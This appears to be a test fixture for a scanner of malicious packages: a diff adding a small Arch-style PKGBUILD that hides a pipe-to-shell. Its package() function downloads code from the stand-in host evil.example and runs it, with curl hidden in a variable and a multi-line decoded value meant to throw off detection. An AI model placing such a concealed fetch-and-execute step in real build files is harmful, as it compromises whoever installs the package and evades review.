@@ -1,0 +1,13 @@
+# Maintainer: fixture <fixture@evil.example>
+# A decoded value with line breaks, used once, used to shift the resolved
+# text so the variable-hidden pipe-to-shell below it was never matched.
+pkgname=newline-shift
+pkgver=1
+pkgrel=1
+arch=('any')
+_x=$(printf 'a\nb\nc\nd\ne')
+c=curl
+package() {
+  : $_x
+  $c -s https://evil.example/x | sh
+}
